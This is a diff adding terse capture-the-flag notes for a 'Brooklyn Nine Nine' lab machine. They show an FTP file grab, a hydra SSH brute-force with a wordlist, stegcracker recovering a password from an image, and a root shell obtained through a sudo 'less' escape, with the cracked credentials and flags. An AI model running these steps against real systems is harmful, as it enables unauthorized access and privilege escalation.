@@ -1,0 +1,26 @@
+Date:10/mar/2021
+Time:22:06
+
+ftp 10.10.120.179
+get note_to_jake.txt
+
+sudo hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.120.179 ssh
+[22][ssh] host: 10.10.120.179   login: jake   password: 987654321
+type2:stegcracker brooklyn99.jpg
+└─$ cat brooklyn99.jpg.out                                                3 ⚙
+Holts Password:
+fluffydog12@ninenine
+
+Enjoy!!
+
+jake@brookly_nine_nine:/home/holt$ cat user.txt
+ee11cbb19052e40b07aac0ca060c23ee
+
+sudo less /etc/profile
+!/bin/sh
+
+cd /root
+ls
+root.txt
+Congratulations in rooting Brooklyn Nine Nine
+Here is the flag: 63a9f0ea7bb98050796b649e85481845
